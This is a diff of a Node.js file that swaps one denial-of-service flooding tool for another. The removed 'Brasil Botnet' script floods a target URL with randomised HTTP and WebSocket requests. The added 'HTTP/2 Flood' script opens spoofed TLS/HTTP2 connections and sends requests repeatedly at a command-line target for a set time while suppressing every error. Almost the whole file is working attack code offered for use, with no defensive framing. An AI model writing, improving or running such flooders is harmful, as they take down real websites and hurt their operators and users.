@@ -1,170 +1,116 @@
-const http = require('http');
-const WebSocket = require('ws');
+const { exec } = require('child_process');
+require('events').EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
+
 const fs = require('fs');
-const urlModule = require('url');
+const url = require('url');
+const http = require('http');
+const tls = require('tls');
+const crypto = require('crypto');
+const http2 = require('http2');
 
-let url = '';
-let host = '';
-const headersUserAgents = fs.readFileSync('useragents.txt', 'utf-8').split('\n');
-const headersReferers = fs.readFileSync('referers.txt', 'utf-8').split('\n');
-let requestCounter = 0;
-let flag = 0;
-let safe = 0;
+let payload = {};
 
-function incCounter() {
-  requestCounter += 1;
+try {
+var objetive = process.argv[2];
+var parsed = url.parse(objetive);
+} catch(error){
+    console.log('Fail to load target date.');
+    process.exit();
 }
+const sigalgs = [
+    'ecdsa_secp256r1_sha256',
+    'ecdsa_secp384r1_sha384',
+    'ecdsa_secp521r1_sha512',
+    'rsa_pss_rsae_sha256',
+    'rsa_pss_rsae_sha384',
+    'rsa_pss_rsae_sha512',
+    'rsa_pkcs1_sha256',
+    'rsa_pkcs1_sha384',
+    'rsa_pkcs1_sha512',
+ ];
 
-function setFlag(val) {
-  flag = val;
-}
+ let SignalsList = sigalgs.join(':');
 
-function setSafe() {
-  safe = 1;
-}
-
-function buildBlock(size) {
-  let outStr = '';
-  for (let i = 0; i < size; i++) {
-    const a = Math.floor(Math.random() * (90 - 65 + 1)) + 65;
-    outStr += String.fromCharCode(a);
-  }
-  return outStr;
-}
-
-function usage() {
-  console.log("Brasil Botnet created per Seyzalel");
-  console.log("Usage: node brasil.js <url>");
-}
-
-function httpCall(targetUrl) {
-  let code = 0;
-  const paramJoiner = targetUrl.includes("?") ? "&" : "?";
-  const options = {
-    hostname: host,
-    path: targetUrl + paramJoiner + buildBlock(Math.floor(Math.random() * (10 - 3 + 1)) + 3) + '=' + buildBlock(Math.floor(Math.random() * (10 - 3 + 1)) + 3),
-    headers: {
-      'User-Agent': headersUserAgents[Math.floor(Math.random() * headersUserAgents.length)],
-      'Cache-Control': 'no-cache',
-      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-      'Referer': headersReferers[Math.floor(Math.random() * headersReferers.length)] + buildBlock(Math.floor(Math.random() * (10 - 5 + 1)) + 5),
-      'Keep-Alive': Math.floor(Math.random() * (120 - 110 + 1)) + 110,
-      'Connection': 'keep-alive',
+ try {
+var UAs = fs.readFileSync('useragents.txt', 'utf-8').replace(/\r/g, '').split('\n');
+ } catch(error){
+     console.log('Fail to load useragents.txt')
+ }
+class TlsBuilder {
+    constructor (){
+        this.curve = "GREASE:X25519:x25519";
+        this.sigalgs = SignalsList;
+        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom;
     }
-  };
 
-  const req = http.request(options, (res) => {
-    incCounter();
-  });
-
-  req.on('error', (e) => {
-    console.error(`problem with request: ${e.message}`);
-    setFlag(1);
-    console.log('DDOS ESTA SENDO EXECUTADO COM SUCESSO!');
-    code = 500;
-  });
-
-  req.end();
-  
-  return code;
-}
-
-function webSocketCall() {
-  const ws = new WebSocket('ws://' + host, {
-    headers: {
-      'User-Agent': headersUserAgents[Math.floor(Math.random() * headersUserAgents.length)],
-      'Referer': headersReferers[Math.floor(Math.random() * headersReferers.length)] + buildBlock(Math.floor(Math.random() * (10 - 5 + 1)) + 5),
+    Alert(){
+        console.log('HTTP/2 Flood by @Icmpoff');
     }
-  });
 
-  ws.on('open', function open() {
-    ws.send(buildBlock(Math.floor(Math.random() * (50 - 10 + 1)) + 10));
-  });
+    http2TUNNEL(socket){
+        socket.setKeepAlive(true, 1000);
+        socket.setTimeout(10000);
+        payload[":method"] = "GET";
+        payload["Referer"] = objetive;
+        payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
+        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
+        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
+        payload['client-control'] = 'max-age=43200, s-max-age=43200';
+        payload['Upgrade-Insecure-Requests'] = 1;
+        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
+        payload['Accept-Encoding'] = 'gzip, deflate, br';
+        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1'
+        payload[":path"] = parsed.path;
 
-  ws.on('message', function incoming(data) {
-    incCounter();
-  });
-
-  ws.on('error', function error(e) {
-    console.error(`WebSocket error: ${e.message}`);
-  });
-}
-
-class HTTPThread {
-  run() {
-    try {
-      while (true) {
-        httpCall(url);
-      }
-    } catch (ex) {
-      console.error(ex);
+        const tunnel = http2.connect(parsed.href, {
+            createConnection: () => tls.connect({
+                host: parsed.host,
+                servername: parsed.host,
+                secure: true,
+                honorCipherOrder: true,
+                requestCert: true,
+                secureOptions: this.Opt,
+                sigalgs: this.sigalgs,
+                rejectUnauthorized: false,
+                ALPNProtocols: ['h2'],
+            }, () => {          
+        for (let i = 0; i < 12; i++) {
+            setInterval(async () => {
+                await tunnel.request(payload).close()
+            });
+        }
+            })
+     });
     }
-  }
 }
 
-class WebSocketThread {
-  run() {
-    try {
-      while (true) {
-        webSocketCall();
-      }
-    } catch (ex) {
-      console.error(ex);
-    }
-  }
+BuildTLS = new TlsBuilder();
+BuildTLS.Alert();
+const keepAliveAgent = new http.Agent({ keepAlive: true });
+
+function Runner(){
+    const req = http.get({ 
+        host: parsed.host,
+        port: 443,
+        path: parsed.path
+        }, (res) => {
+            BuildTLS.http2TUNNEL(res.socket);
+        });
+
+        req.on('error', () => {
+          req.abort();
+        });
 }
 
-class MonitorThread {
-  run() {
-    let previous = requestCounter;
-    setInterval(() => {
-      if ((previous + 100 < requestCounter) && (previous !== requestCounter)) {
-        console.log(`${requestCounter} Requests Sent`);
-        previous = requestCounter;
-      }
-    }, 1000);
-  }
-}
+setInterval(Runner)
 
-if (process.argv.length < 3) {
-  usage();
-} else {
-  if (process.argv[2] === "help") {
-    usage();
-  } else {
-    console.log("---- INICIANDO ----");
-    if (process.argv.length === 4) {
-      if (process.argv[3] === "safe") {
-        setSafe();
-      }
-    }
-    url = process.argv[2];
-    if (url.split("/").length === 3) {
-      url += "/";
-    }
-    const parsedUrl = new URL(url);
-    host = parsedUrl.hostname;
+setTimeout(function(){
+    console.log('This attack is end')
+    process.exit();
+}, process.argv[3] * 1000);
 
-    process.on('SIGINT', () => {
-      console.log('\n-- INTERRUPTED --');
-      process.exit();
-    });
-
-    for (let i = 0; i < 600; i++) {
-  setTimeout(() => {
-    const t = new HTTPThread();
-    t.run();
-  }, 0);
-}
-
-for (let i = 0; i < 600; i++) {
-  setTimeout(() => {
-    const ws = new WebSocketThread();
-    ws.run();
-  }, 0);
-}
-
-const monitorThread = new MonitorThread();
-monitorThread.run();
-  }
-}
+process.on('uncaughtException', function(er) {
+});
+process.on('unhandledRejection', function(er) {
+});
